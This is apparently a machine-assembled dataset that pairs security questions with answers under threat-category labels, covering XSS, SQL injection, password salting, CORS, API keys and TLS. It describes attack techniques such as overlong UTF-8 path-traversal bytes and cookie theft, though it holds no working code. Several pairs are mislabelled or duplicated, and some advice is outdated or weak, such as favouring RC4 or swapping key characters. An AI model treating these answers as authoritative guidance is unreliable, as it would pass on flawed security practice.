(CSRF taken care of), and my one-time form token (form resubmission taken care of). Both issues are resolved without any ill effect on the user experience.  Of course, you may decide that that's too much to implement for such a simple feature. I think it is, anyway. Regardless, a solid solution exists if you want it. "
  },
  {
    "Threat": "T",
    "Attack": " When it comes to password security there are things that people agree on like storing salted hashes of passwords, which gives a statistical defense against a compromised model and data. ",
    "Mitigation": " When it comes to password security there are things that people agree on like storing salted hashes of passwords, which gives a statistical defense against a compromised model and data. "
  },
  {
    "Threat": "I",
    "Attack": " You don't need to make salts really long and it's not important that they be cryptographically secure. The point of salts is simply to make rainbow table attacks harder as you no longer have a 1-to-1 mapping between passwords and hashes. (They also keep administrators with wandering eyes from seeing 482c811da5d5b4bc6d497ffa98491e38 in the database and then knowing Joe's password is \"password123\".) ",
    "Mitigation": " You don't need to make salts really long and it's not important that they be cryptographically secure. The point of salts is simply to make rainbow table attacks harder as you no longer have a 1-to-1 mapping between passwords and hashes. (They also keep administrators with wandering eyes from seeing 482c811da5d5b4bc6d497ffa98491e38 in the database and then knowing Joe's password is \"password123\".) "
  },
  {
    "Threat": "I",
    "Attack": " Is it a wise and practical approach to keep php files outside the public folder to restrict possible access by attackers? If yes, is it common? because I do not see any disadvantage (except a little bit harder handling of file spread in different places); but if it is beneficial for improve security, it is worth of consideration. Since I do not know about the ways hackers attach a php-based website, I have no idea how it can improve security.    Is it a wise and practical approach to keep php files outside the  public folder to restrict possible access by attackers? ",
    "Mitigation": "   Is it a wise and practical approach to keep php files outside the  public folder to restrict possible access by attackers?  Yes.  In this example, since all the files are in the document root, an external user could hit the url [LINK] and run that include file directly, independent of the auth system that's supposed to be sourcing it. Will it do anything bad when run by itself? Probably not. But to be safe, you should move the include files outside document root, thus making it impossible for the web server to serve them directly.  (Note that this vulnerability is not exclusive to PHP, and thus keeping your libs outside document root is a good practice, regardless of platform.) "
  },
  {
    "Threat": "S",
    "Attack": "",
    "Mitigation": " From [LINK]:10. Security ConsiderationsImplementers of UTF-8 need to considerthe security aspects of how theyhandle illegal UTF-8 sequences.  It isconceivable that in some circumstancesan attacker would be able to exploitan incautious UTF-8 parser by sendingit an octet sequence that is notpermitted by the UTF-8 syntax.A particularly subtle form of thisattack can be carried out against aparser which performssecurity-critical validity checksagainst the UTF-8 encoded form of itsinput, but interprets certain illegaloctet sequences as characters.  Forexample, a parser might prohibit theNUL character when encoded as thesingle-octet sequence 00, buterroneously allow the illegaltwo-octet sequence C0 80 and interpretit as a NUL character.  Anotherexample might be a parser whichprohibits the octet sequence 2F 2E 2E2F (&quot;/../&quot;), yet permits the illegaloctet sequence 2F C0 AE 2E 2F.  Thislast exploit has actually been used ina widespread virus attacking Webservers in 2001; thus, the securitythreat is very real.So it's vitally important to ascertain that your data is valid UTF-8.But once you have done this, security concerns related to the encoding are minimal.  All HTML special characters are in ASCII, and UTF-8 like ISO-8859-1 is fully ASCII-compatible.  [CODE] will behave the way you expect.There is more of a concern with non-ASCII-compatible encodings.  For example, in [LINK], the ASCII bytes 0x30 and above can occur within the encoding of a multi-byte character.  The HYPHEN character [CODE] (U+2010) is encoded as A9 5C, which includes an ASCII backslash.  This makes it more difficult to properly handle backslash escaping, inviting [LINK]. "
  },
  {
    "Threat": "T",
    "Attack": " Does Named Query feature of Hibernate helps to prevent SQL Injection attack? I am defining named queries in hbm.xml file not as annotation.<br/> ",
    "Mitigation": " Yes. Read this [LINK] and [LINK]. "
  },
  {
    "Threat": "E",
    "Attack": " Pointers and insight on security measures that I should take into consideration when developing software, mainly games, such as the one described below. By security I mean checking and double checking that a user doesn't act in a way not intended. This could mean behaviour such as sending his/her updated collection of the most malicious viruses in existance to the server/other clients, or otherwise compromise the user-experience for other players by, for example, hacking. ",
    "Mitigation": " all other players and/or the server should validate the update, since it is discreet values your dealing with it should not be a problem. Client side checks might be enough but a sharp hacker can hack the check by changing the check to some thing like "
  },
  {
    "Threat": "T",
    "Attack": " Any malicious user can turn on chrome debugger for example, and modify javascript code that is being executed. So he can put his own functions to be executed etc.    Any malicious user can turn on chrome debugger for example, and modify  javascript code that is being executed. So he can put his own  functions to be executed etc.  However, the difference between eval and developer tools is that eval may execute things in shareable links. The attacker could send their victim a link, which exploits the code evaluation function.  Take this to the next stage and the attacker could construct an image link to send the session cookie to themselves  This is known as a [LINK] attack. In fact, the type is a DOM based XSS, to be specific. ",
    "Mitigation": " Yes, a user can \"attack\" their own client-side session using JavaScript by using developer tools.  However, the difference between eval and developer tools is that eval may execute things in shareable links. The attacker could send their victim a link, which exploits the code evaluation function.  Yes, code that's secure against XSS could be considered \"secure JavaScript code\" - it protects the current user from cross-domain attacks. However, server-side code that \"trusts\" that the current end-user won't modify JavaScript code or variables to their own advantage using developer tools though isn't secure.  Therefore secure JavaScript code is such code that will protect the current user only. "
  },
  {
    "Threat": "T",
    "Attack": " I've been reading the docs for Oracle VPD (Virtual Private Database, a.k.a. fine-grained security, the basis of label-based security), and there's something I'm having a hard time grasping. How does VPD prevent a user from leaking information using a malicious function in the [CODE] clause?  ? Where [CODE] inserts each value it sees into another table owned by the malicious user's control, so they can then see the secret data by selecting that table.  (I'm also curious about whether a malicious predicate function in a VPD policy could cause a privileged user to run user-supplied code they did not intend by generating a predicate that refers to the malicious function, but that's somewhat separate.) ",
    "Mitigation": " The \"malicious function\" is run after the VPD policy is applied, so it cannot see the hidden data.  So, in your example, the following query:  [CODE]  Gets rewritten to:  [CODE]  Therefore, the function is only executed for rows that satisfy the VPD predicate.  Refer: [LINK]    When a table alias is required (for example, parent object is a type  table) in the predicate, the name of the table or view itself must be  used as the name of the alias. The server constructs the transient  view as something like    [CODE] "
  },
  {
    "Threat": "E",
    "Attack": " is there any way to protect encryption keys that are being stored in RAM from a freezer attack? (Sticking the computer in a freezer before rebooting malicious code to access the contents of RAM) ",
    "Mitigation": " You could use something like the [LINK] Linux kernel patch to keep the key inside ring 0 (the highest privilege level) CPU debug registers only, which when combined with an Intel CPU that supports the AES-NI instruction, doesn't need to result in a performance penalty (despite the need for key recalculation) compared to a generic encryption implementation. "
  },
  {
    "Threat": "T",
    "Attack": " I am considering unserializing parts of information that will get transmitted via network, that could (in theory) be tampered with by a malicious user.   I understand, that the malicious user can inject an arbitrary R object that can be full of harmful code. But this is not what I am worrying about, because I can (I think I can) prevent such code from ever executing by careful handling of the received objects. ",
    "Mitigation": " I understand, that the malicious user can inject an arbitrary R object that can be full of harmful code. But this is not what I am worrying about, because I can (I think I can) prevent such code from ever executing by careful handling of the received objects. "
  },
  {
    "Threat": "I",
    "Attack": " Does anyone know of a Django App which can be used to extend django auth and lock accounts if a brute force password guessing attack is mounted? ",
    "Mitigation": " [LINK] is what you are looking for. "
  },
  {
    "Threat": "I",
    "Attack": " You can never trust the client. Even if you obfuscate, someone could still figure it out. For example, an adversary could reverse-engineer the obfuscation algorithm, look at the device memory, or even capture what's sent over the wire. ",
    "Mitigation": " You can never trust the client. Even if you obfuscate, someone could still figure it out. For example, an adversary could reverse-engineer the obfuscation algorithm, look at the device memory, or even capture what's sent over the wire.  However, you can still make a secure app by enforcing security on the server side. For example, users should need to be authenticated in order to successfully make privileged API requests.  Also, you can enforce API usage on the server side, whether by input validation, rate limiting, or IP address tracking. "
  },
  {
    "Threat": "T",
    "Attack": " Everyone knows or should know parameterized queries help to protect against SQL injection. All of the tutorials and documentation I have seen have revolved around using prepared SQL queries to process form input. But what about when there isn't any form input? I.e. a subsequent query after a user has been logged in such as [CODE]  So in short, the question is trust. If you absolutely trust the source of the data (like for example because it's static, hard-coded, or for some other reason), that's fine to use it directly in queries. But in case of SQL injection, using it properly (ie. in parameters) is so easy that you should just do that. ",
    "Mitigation": " The question is not whether the source of the data written in a SQL query is a http form. It's not even if it's from the current request.  The question is whether you trust the source of the data. And that may be a complex question.  You obviously do not trust something that comes from the current request. You also don't trust something that may have come from an earlier request, like for examples fields in a database that are modified by request data. But you also may or may not trust other fields in your database. For example you have IT ops staff, or DB admins. Do you trust them to not inject some kind of an XSS or secondary SQLi attack into a database field to steal user credit card data, which is stored in an audited table, so they cannot just go in and dump it without being noticed? If they injected javascript or a clever SQLi in the right place in a table that is not audited, they may steal credit card info by exploiting the vulnerable application, then change it back and remove all traces.  Also an application may have different sources for data, other systems may for example upload files (say XML) on APIs, data from those will be processed, some of it will eventually make it to the UI or used in SQL queries. If you trust those sources, you may choose to not implement protection against SQLi or XSS. But why would you, when it is easy? Multiple layers of defenses is always better than walking on thin ice.  So in short, the question is trust. If you absolutely trust the source of the data (like for example because it's static, hard-coded, or for some other reason), that's fine to use it directly in queries. But in case of SQL injection, using it properly (ie. in parameters) is so easy that you should just do that.  Also consider future changes. You are writing it in a SQL string without parameters because you know that it's safe now. Months pass, somebody adds a new feature, modifies your query, adds a few more parameters, one is from the request. But the pattern was already there, he will probably just copy-paste and go with the pattern - and your application is vulnerable.  My final point is static security scanners, those that look at your source code. Pretty much all of those will flag your code for SQLi if a variable is included in the query string itself without using parameters. That may of course be a false positive, but I doubt you want to bother with those findings, when you can avoid them in the first place.  So sometimes it's not just about the technical exploitability, there are other aspects too. "
  },
  {
    "Threat": "S",
    "Attack": " Hello I am working on android application in which i required to execute few https web services so all my webservice URL and Web API KEY are in the code plus ip address of the server. When anyone do reverse engineering of my app then that guy can get my web service URL as well as API KEY then can simply hit it using rest client. ",
    "Mitigation": " I have faced the same issue.First to ensure that this is the app that I have created is calling the webservice only. even if they get the key by reveres engineering. secondly the valid user is calling the application.The following checks are done in the server.  1)Verify that it\u9225\u6a9a really signed by Google.  2)Verify that it\u9225\u6a9a really meant for you.  you need to use Google developer console [LINK]create two Client Ids (One for the server and other for the android application.) under the Menu API &amp; auth. To create client ID for the android application you can use keytool[CODE]  I have followed the steps from [LINK]  Serverside php sample is given below  [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " Somebody can steal the encrypted SID and start making requests as if they were that user.  Decrypt it, being careful that a hacker can generate encrypted values that will break the decryption routine and throw exceptions which you must hide.Verify the Session ID, Timestamp, unique number and client information all match what you recorded when you create the session.  If anything is wrong you immediately expire the session.  Expired sessions then coming back on subsequent requests are not even verified, they simpy generate a 403.  If you are using network information to secure the token, this will mean that the user will have problems using the service if they are on a roaming network. ",
    "Mitigation": " Right, here goes - it's a long answer...  The problem with doing this going to be that persisting the SID is not going to be enough to be able to reauthenticate the user if you need to perform an action on their behalf (i.e. impersonate that user) - for that you need a OS-provided security token.  If you have just the SID you still need the password in this scenario - unless you use reversible encryption in your AD store, which I seriously doubt is the case - and certainly hope that it's not!  Beyond that, there's also the problem that once you encrypt that SID and send it back, it might be safe over-the-wire (as long as we assume that HTTPS is always secure), but not once it's on the client machine.  Somebody can steal the encrypted SID and start making requests as if they were that user.  In my opinion, if you're using AD as your backend authentication store then you should use Negotiate or Kerberos authentication only.  The tickets it produces can then be used to impersonate the user if need be; and I don't believe they can be stolen (although in the security world, almost anything is technically possible).  However you might potentially make your web service very difficult to consume doing this - I certainly wouldn't think of coding my own client for these protocols.  Before I say what I might do if I were faced with this, I'll say first that it's not really secure - it's just a bit trickier for someone to mess with whilst also removing the association of the token from the actual user (patterns behind encrypted information are a hacker's best friend).  There are also other caveats that I list afterwards:  Use AD as the authentication method but no more, keep track of authentication sessions separately and give them unique keys that do not relate directly to AD SIDs - guids or something like that.  That way each time a user authenticates they would get a different core session ID.I would stamp each session with the time it was created as well as a cryptographically secure unique random salt (a nonce - although it's not being used here in the same way that [LINK] describes it. Use [LINK] for this).  I would also incorporate some (but not all) information about the client (ip, user agent) in there as well.I would then construct a token first as a string combining all this information together and then encrypt it using perhaps at least the [LINK] [LINK] implementation with a 128 bit IV and 256 bit key (both of which must be kept very safe and should be generated randomly again using the [LINK]!).  You send this back to the client and they use it in their requests from then on (until it expires - which it absolutely must do).  When you receive the token you  Decrypt it, being careful that a hacker can generate encrypted values that will break the decryption routine and throw exceptions which you must hide.Verify the Session ID, Timestamp, unique number and client information all match what you recorded when you create the session.  If anything is wrong you immediately expire the session.  Expired sessions then coming back on subsequent requests are not even verified, they simpy generate a 403.  If you are using network information to secure the token, this will mean that the user will have problems using the service if they are on a roaming network.  Authentication sessions should never be open-ended - they should have expiry times to prevent a very old token being able to be used.  And it goes without saying to use HTTPs all the way of course.  All that said - your choice of authentication etc should be proportional to the kind of data being transmitted and the things that people can do.  If a hacker isn't going to be interested in your service; or if the environment is completely internal, then crack on with your original idea.  <h1>CAVEATS&#8734;!</h1>  (that's to the power of infinity there)  Whilst I have suggested this solution, it is not secure for many reasons and if there any real secrets involved I wouldn't use it.  It relies on HTTPS to authenticate the server to the client - which is very important before that client hands over their user name and password combination.  Take that away and it breaks and, if you manipulate the certificate chain on the client computer can be completely sidestepped as well.  It also relies on the HTTPS channel to protect the username/password combination in transit.  We should be going further and introducing message numbering and signatures on the requests to make sure that a client is still who they present themselves to be because IP addresses and headers are easily spoofed.  We should also probably be looking at asymmetric encryption using large primes and all that jazz for the password transfer before even HTTPs is taken into account.  So, basically, if it's security-critical - ignore me and consult an expert - do not try and roll your own because you will get it wrong.  If you're only likely to be hacked by a 12 year old geek for no more reason than because that's what 12 year olds do, then my solution might be too heavy and you might as well go with your idea.  Either way - I make no warranty of what can/might happen and I guess in a way this now very long answer is actually saying that you both listen to me and ignore me at your peril :) "
  },
  {
    "Threat": "I",
    "Attack": " Some think that \"If an attacker can read your memory, you have 100% lost.\" (comment to [LINK]), which indicates that whether you store passwords in memory or not might be superfluous, since you're screwed anyway if they have access to your memory (see [LINK], which shows an example of how access to memory in an umnanaged environment can be pretty disastrous). ",
    "Mitigation": " You seem to be concerned about the user-side of security. I think we agree that if your attacker can write your process memory, your security is gone whatever clever tricks you may employ. If your attacker can neither read nor write your process memory, you are safe even in your scenario of passwords in memory.   So the question focuses on the scenario that your attacker can freely read your process memory, but cannot manipulate it. Whatever you save, encrypt or hide, your routine to load, decrypt or unveil is in memory, too. So basically, every method you can employ to secure your data is not hard security, it's security by obscurity. Sooner or later, it will be read, too. Then it will be used to break your security.  So as long as you don't have some really nice and freaky hardware, if someone is able to read your process, he's able to break your security. It may take a while, the better your security measures are, the longer it will take. But it's never \"secure\" by design, it's only secure if it takes more effort than it's worth to break that security.  As a personal opinion not backed by facts, I think that if someone got read-process privileges on your Windows application, you are gone security-wise. If he got read process privileges, he has rooted your box anyway. "
  },
  {
    "Threat": "S",
    "Attack": " The referer header in the request is technically user input, which should not be trusted. However, obviously there is some control over this as referer should be set by the browser and it is not supposed to be overridden by some malicious website. There are circumstances when referer can in fact be faked. For example if a malicious browser plugin is used, like an old vulnerable version of Flash or Java - both could do this at some point afaik. Or a malicious browser extension. Or the originating client is not a browser and hence such protection on referer does not apply. ",
    "Mitigation": " Maybe these are not applicable to your scenario, but if referer was safe, it would also be adequate for csrf protection, which it is not (or at least not recommended).  It is about defense in depth. Maybe you don't exactly know how this would be exploited, but in many cases it's betfer not to have this weakness. Having said that, [CODE] may be ok in many scenarios, while it is not ok in many others. Your threat model should cover this too. "
  },
  {
    "Threat": "E",
    "Attack": " To give context why it is the way it is, the payload contains an expiration time and on the device when the token is about to expire i should prompt the user to re enter their credentials to get a new token. Now this might seem like a security threat because a hacker could manipulate the token on the device, but the server checks the token to make sure it is authentic which is why i do not want the key on the device because this can be mined by a hacker, and make the entire application vulnerable. ",
    "Mitigation": " Well the answer was pretty simple although in my opinion should be in the framework. But a simple non signed JWT still has the 2 required periods in it but there is nothing after the last one, so i split my JWT on the periods and combined the first and second one with periods and put a period at the end.  [CODE]  This was usings the [LINK] library. "
  },
  {
    "Threat": "D",
    "Attack": " My app has a register service that users can register themselves. However, someone with malicious intent can write a script to register thousands of accounts in seconds. ",
    "Mitigation": " Dos attack can be prevented in so many ways and there are already some very established technology for that. You may track the hit from a specific IP address in your server side container and may block the IP address temporarily if you want. In case of distributed attacks, you may consider ignoring the requests which are beyond your capacity.   These are some trivial suggestions. You may consider having a firewall in your server side too which may give to these built in supports. CloudFlare is one of the firewalls used widely.   There are too many options you may take precaution on dos attacks. Just pick one of them in your server side. In case of your web application, you might consider keeping a google re-captcha, but for mobile application the idea of showing a captcha is horrible.  "
  },
  {
    "Threat": "T",
    "Attack": "   Security Recommendation: It is highly recommended that you do not  hard-code the exact public license key string value as provided by  Google Play. Instead, you can construct the whole public license key  string at runtime from substrings, or retrieve it from an encrypted  store, before passing it to the constructor. This approach makes it  more difficult for malicious third-parties to modify the public  license key string in your APK file. ",
    "Mitigation": " If you really can't sleep at night and want to do something.. Place your key in your code with the first two characters switched. Then during runtime, switch the two characters back before using the key. This should be enough to protect yourself against brute force automated attacks.. Intelligent attacks you can't do anything about.  Edit:  If you're looking for an industry standard way to protect your code, use a commercial obfuscator. These tools are designed for this purpose. Some examples are [LINK]. Make sure to use fully featured commercial versions that include string encryption.  "
  },
  {
    "Threat": "T",
    "Attack": " I want to restrict the execution of Javascript on my website to prevent the execution of malicious code in the browser. Presuming, my HTML website is accessible via the URI [CODE], I want to make sure that only the script in [CODE] is executed by the browser. The browser should NOT: ",
    "Mitigation": " The traditional way to protect against XSS is by sanitizing all user-supplied input, but that can be tedious and error-prone. The HTTP header that is designed to prevent XSS is [LINK]. The major problem with relying strictly on CSP for XSS protection is that Internet Explorer (even version 11) does not support any version of the CSP header (unless that's changed since the last time I checked).  So, for today, CSP is a good practice to enable on your server if you can, but you'll still have to sanitize inputs to deal with IE users (or users with really old browsers). Also, keep in mind that CSP (in the strictest implementation) will prevent even your own web site code from executing embedded JavaScript. The recommended practice is to enable CSP in \"warn only\" mode first and check your logs to make sure you aren't shooting yourself in the foot.  "
  },
  {
    "Threat": "I",
    "Attack": " The problem is I want to store these data securely in the vb.net application so that It's hard for any hackers/crackers through (reverse engineering or programs like cheat engine) to get my gmail account data. ",
    "Mitigation": " You have a number of secure options:  Setup a webservice to receive your messages and email them onto you/log them to a databaseLog your messages to a 3rd Party system (irc? news? some p2p network, IM system), and pick um the messages later.Setup a Source Control/issue site for your system, google code/bitbucket/something else that has the ability to receive issues via an api. "
  },
  {
    "Threat": "T",
    "Attack": " I'm wondering what security issues I should be aware of while doing this. I've already taken measures to avoid any simple XSS insertions, because my XML library will escape any special characters, but I imagine there are more sophisticated attacks. ",
    "Mitigation": " In addition to ignoring javascript:, you should probably only make hyperlinks for the http: protocol, because there are certain applications that can be launched or controlled through other protocols. Steam, Skype, and AOL Messenger come to mind. "
  },
  {
    "Threat": "I",
    "Attack": " URLs with their query strings parameters are saved in web server log, and access to them could compromise security.Third party application like Google Analytic could store in their report such URLs and query string. ",
    "Mitigation": " You could perhaps create a one-time access token to the SPA rather than sending the original bearer token as the query string.  This token could then be sent to the API, decoded and used to create the real auth token, but would have the advantage of only being valid once. Now you no longer need to worry about server logs, GA, etc. I suppose it's a form of redirection to alleviate those concerns. "
  },
  {
    "Threat": "I",
    "Attack": " Is Heroku currently preferring CBC cipher connections? If so, does this mean customer dynos are currently vulnerable to BEAST?  Since server-preferred order puts [CODE] at the bottom of the list, I'm concluding that Heroku is currently vulnerable to BEAST.    BEAST attack  Vulnerable   INSECURE ([LINK])  The best way to defend against the attack demonstrated by BEAST is adopting (both in clients &amp; servers) TLS 1.1. In its absence, the next best thing would be TLS_RSA_WITH_RC4_128_SHA, in my opinion, even if it's considered \"less secure\" than AES. Wikipedia has a decent writeup on the known attacks on RC4. Most of them are biases of the output. To give you an idea of the severity of the attacks see the following quotes from the Wikipedia page: ",
    "Mitigation": " The best way to defend against the attack demonstrated by BEAST is adopting (both in clients &amp; servers) TLS 1.1. In its absence, the next best thing would be TLS_RSA_WITH_RC4_128_SHA, in my opinion, even if it's considered \"less secure\" than AES. Wikipedia has a decent writeup on the known attacks on RC4. Most of them are biases of the output. To give you an idea of the severity of the attacks see the following quotes from the Wikipedia page:    The best such attack is due to Itsik Mantin and Adi Shamir who showed  that the second output byte of the cipher was biased toward zero with  probability 1/128 (instead of 1/256).  also:    Souradyuti Paul and Bart Preneel of COSIC showed that the first and  the second bytes of the RC4 were also biased. The number of required  samples to detect this bias is 2^25 bytes.  The following bias in RC4 was used to attack WEP:    ..over all possible RC4 keys, the statistics for the first few bytes  of output keystream are strongly non-random, leaking information about  the key. If the long-term key and nonce are simply concatenated to  generate the RC4 key, this long-term key can be discovered by  analysing a large number of messages encrypted with this key.  However, SSL/TLS does not use a long-term key with a nonce, but establishes a new key for RC4 by hashing (using either MD5 or SHA1, as you've seen in Qualys SSL Labs tests) with every connection (and refreshes the key after some period of time).  You can read some more opinions on this matter in this [LINK] (if you ignore the trolls). "
  },
  {
    "Threat": "T",
    "Attack": " And I know Laravel is secured for CSRF attacks.  Is there any thing that should i know ? What about SQL Injection. Is Laravel secure or not? ",
    "Mitigation": " <h3>The short answer</h3>Laravel 5.1 is well secured what regards to SQL injection, CSRF and XSS per default.<h3>More details</h3>In my opinion, what you should be aware of:1- It is not only Laravel alone that is responsible for your web application security, but the environment surrounding it.<br />\u807d\u807d\u807d - Web server should be configured correctly and secure.<br />\u807d\u807d\u807d - It is an advantage to SSL (Certificate) among your domain.<br />\u807d\u807d\u807d - Do only use SFTP over SSH for file transfer and do only use SSH for console connection.<br />\u807d\u807d\u807d - Use trusted provider and physically secured Server environment.<br />\u807d\u807d\u807d - Backup your files and your database regularly and move the data out side your provider server location.<br />\u807d\u807d\u807d - Make different username and password for SSH console, database or other services.<br />\u807d\u807d\u807d - For SSH access and Database access, do not use admin or root username often, keep it only for emergency use, in stead create a sub admin/root account and use that in stead.2- Above all of that, when you further develop on your Laravel, you might risk performing bad programming which breaks the default security rules of Laravel.<h3>Conclusion</h3>Therefore, it is suggested not counting on default security. You need to do your own penetration test when your project is done to ensure every thing is working and secured as planned. And follow some of the simple security rules then you would perfectly be on the safe side.I suggest you to look at this link regarding [LINK] and as @ImtiazPabel comments [LINK].Finally this link is good to check:[LINK][LINK][LINK] "
  },
  {
    "Threat": "S",
    "Attack": " There are many discussions about security risk for saving hash password in cookies, as upon accessing to the user's computer, a hacker can log in with the saved password. If a hacker has access to the user's computer, he can catch the password, as browsers also save passwords locally (encrypted of course). What is the difference between password set in cookies with that saved by the browser?  Most important is the risk of exposing the password. This would not only put your site at risk, but potentially other sites as well. Most users re-use their password for everything, and the password would probably give an intruder access to both the users email account and netbank. Someone with access to the hashed value may use brute force or rainbow tables to discover the original password (rainbow tables are long lists of pre-calculated hashes). Rainbow tables are easily available for passwords up to more than 8 characters, and even longer. You may avoid this by salting the password so that it is i.e. more than 20 characters before you create the hash (remember to store the salt in the cookie as well). A properly salted password hash calculated with a safe hashing algorithm should be quite safe. ",
    "Mitigation": " I suppose the reason why you would want to store a hashed password in a cookie is to create a \"remember me\" cookie. So you need a value for the cookie that is secret, so that not someone else could easily guess it. Anyone with access to this value would be able to log in as this user, so it is actually an \"extra password\".  There are two risks involved here:  Most important is the risk of exposing the password. This would not only put your site at risk, but potentially other sites as well. Most users re-use their password for everything, and the password would probably give an intruder access to both the users email account and netbank. Someone with access to the hashed value may use brute force or rainbow tables to discover the original password (rainbow tables are long lists of pre-calculated hashes). Rainbow tables are easily available for passwords up to more than 8 characters, and even longer. You may avoid this by salting the password so that it is i.e. more than 20 characters before you create the hash (remember to store the salt in the cookie as well). A properly salted password hash calculated with a safe hashing algorithm should be quite safe.  The other risk is connected to the fact that the user must change his original password to make the hashed password string invalid. It is impossible for the user to actually turn off this feature once it is turned on. You may delete the cookie when he un-checks the \"remember me\" button, but that will have no effect if the cookie already is compromised. What if his computer is i.e. stolen? If the user has checked this button on one computer then he must have access to that computer to disable this feature.  "
  },
  {
    "Threat": "T",
    "Attack": " What I'm asking is: if a hacker injects an already signed DLL or EXE with a malcode, effectively changing the file's hash, will it break the digital signature because the signature embeds some kind of digest? Or will the signature be completely unaffected? ",
    "Mitigation": " Substituting 1 single byte will change the SHA1 digest of a file but also cause its Signature to fail checks. The signature will still be there but it will fail any checks. If you send the file to VirusTotal, if you go to properties and click on details on the signature or if you try to run it and look at the Publisher line, you will be notified that the signature is no good. 1 single byte. Brilliant! That being said, I emphasize that the signature wasn't lost (even when I made substitutions of up to 25KB), so when you go to File properties, there will still be a Digital Signatures tab and it will still say Microsoft. This is very misleading and you have to be careful not to end your inspection there because that tab will still be there whether the signature is valid or not. To ensure that you have a good signature, you have to select the signature and click on details. You will then get a dialogue that tells you if that signature is valid or not. This describes the behavior I observed in Windows 7, I didn't have a copy of 8 or 10 handy to see how the properties dialogues behave there.  Making massive size changing modifications to a file will result in the signature being completely destroyed.  "
  },
  {
    "Threat": "T",
    "Attack": " The security team is saying that the above code is vulnerable because [CODE] scope in JAVA can be tampered/altered by external proxy tools. And since ColdFusion is build on JAVA, ColdFusion's [CODE]can also be tampered by external proxy tools. Is this a right assumption? Is JAVA and ColdFusion [CODE] scope same? ",
    "Mitigation": " Transferred from comments with the blessing of the OP.  My opinion is that request scope variables can only be defined and assigned values in the programming code. That means they can't be altered directly. However, if you are assigning a value from the form or url scope, then they can be indirectly altered. In your case, look at how [CODE] receives it's value.  More info.  The request scope is available to any programming file used in the page request, such as the actual page, included files, and custom tags, here is an example that can be altered.  [CODE]  Here is an example that can't.  [CODE]  There is a time and place for everything.  Most of my work does not use the request scope.  One application does. "
  },
  {
    "Threat": "S",
    "Attack": " Someone knows the IP-Address of one of our application servers and wants to fake it to get access to the other application which he knows the listening socket and protocol of.So he alters the Header of his IP packets to have the Webserver IP as transmitter.  So to put this straight: An Attacker that wants to fake my IP-Address needs to compromise the VERY same ISP that is in charge of the IP-Range my Webserver operates in - or this ISP does not do packet inspection. ",
    "Mitigation": " Now I am quite sure that IP addresses ARE inspected and filtered when passing a router.  This assumption is incorrect, despite your level of sureness.  \"Egress filtering\", which is the name of this, is generally not done.  The major protection against widespread spoofing of IP addresses is that the attacker would not recieve any response packets - they would all be routed back to the host that is legitmately using the IP address being spoofed.  This kind of attack is known as \"blind spoofing\", because the attacker is working blind.  In order to send data on a TCP connection, you must be able to finish the TCP \"three-way handshake\".  This requires knowing the initial sequence number used by the opposite end - and since TCP initial sequence numbers are chosen reasonably randomly1, this prevents a blind spoofing attack from being able to do this.  (Note also that this does not apply to UDP - without some kind of application layer preventative, UDP is at significant risk from blind spoofing).  If the attacker can see the replies coming back (say, because he is sniffing the uplink or the local network of your server), then this also doesn't apply - spoofing TCP connections in this case is not just possible but trivial.    1. These days, anyway - this wasn't always the case. "
  },
  {
    "Threat": "I",
    "Attack": " After reading a little bit it seems like a bad idea to store the private keys for whatever 3rd party I'll use in the app (twilio, nexmo, etc). Somebody could reverse engineer these from my binary and use them in their app.  However, having these on the server doesn't help either, somebody could just reverse engineer my server's endpoint that I use to send text messages and use that instead.    However, having these on the server doesn't help either, somebody  could just reverse engineer my server's endpoint that I use to send  text messages and use that instead. ",
    "Mitigation": " <h2>Hiding API Keys on the server</h2>    However, having these on the server doesn't help either, somebody  could just reverse engineer my server's endpoint that I use to send  text messages and use that instead.  Yes it does help a lot.   If somebody gets access to the keys to your web service, they can only do, what your service allows them to do. This is a very good idea to have a web service that encapsulates all the 3d party keys and API - it's way more secure.  Nobody will ever get access to your sensitive keys, that'll allow them to do everything.  For example the 3rd party API allows deleting - your server wrapper API will not allow it.  Moreover, you can add any extra logic or alerts for suspicious behavior.  <h2>Hiding API Keys in the app</h2>  If somebody sets their mind to it, there's no way you can prevent getting your keys reverse engineered from your app. You can only make that harder. Computer security should never be about \"how hard/complicated it is to do\", but in this case we have no choice.  Ok, so you have to hardcode the API keys into your source files. It can be easily reverse-engineered.   You can obfuscate your keys, so that they can't be read directly. The result will be that they'll be scattered in a compiled file, rather than comfortably being placed in one place.  On iOS you can use something [LINK]  On Android you can use [LINK], or any other way to obfuscate a string.  <h2>Encrypting the keys</h2>  Another layer of making it hard for hackers is to encrypt the keys.  [LINK]  You can do the same for Android.  <h2>Perfect Scenario</h2>  Ok, so let's say you have a 3rd party API for video management.  The hacker wants to delete all videos on the server, because the 3rd API allows that.  First he has to glue up all the scattered strings in the file. If he manages to do that, he has to find a way to decrypt that.  Even if he manages to decrypt that, that'll give him the API keys to your server and your server and your server only allows to upload videos, not delete them.  "
  },
  {
    "Threat": "T",
    "Attack": " I have a line where I grab a database row with [CODE].  A normal user would always send an [CODE] that exists in the database, but a hacker might not, and it would throw a [CODE] exception.  Is it important to explicitly catch it or should I just leave the exception uncaught in that case?  Either way, the hacker would not see any message so there is not any security risk either way. ",
    "Mitigation": " The important part is in which context you are using this field. If you access the page through [CODE] I would display a User not found page. If you do something like that  [CODE]  I wouldn't try to catch the error seperately.  All in all I save every error which can not be caused through normal user behaviour. Then I can take a look into my error log and can directly see where my site raises failures or whether hackers tried to find a security hole.  Afterwards I fix this undefined behaviour so that the error log is as empty as possible. "
  },
  {
    "Threat": "S",
    "Attack": " My question is related to the CORS response headers from the AWS API Gateway endpoint, specifically the Access-Control-Allow-Origin response header that is set to any \"' * '\". This article indicates the risks of using the any \"' * '\" parameter, namely that a 'hacker can coopt our site to request any method' on our back-end: ([LINK]). ",
    "Mitigation": " Does Cognito guarantee that the request is coming from mywebsite.com?No. Cognito is agnostic of your domain. All it cares about is user authentication/management.Is there a secure way to implement the any &quot;' * '&quot; Access-Control-Allow-Origin response header?Well yes and no. As you said in your post, Cognito will authenticate the user So that means with [CODE] set, any domain is allowed to make a Cross Origin request, but if they can't provide a valid authentication token, then they get get a 401 error back.If you want to limit what domain can has access, then you can't use [CODE]. [CODE] is a wildcard and hence allows any value. So if you'd instead like to only have mywebsite.com be able to make a CORS request, then replace the [CODE] with [CODE]. This makes it so only requests from that domain are allowed. Requests from attacker.com will now fail because they won't have the proper headers. "
  },
  {
    "Threat": "T",
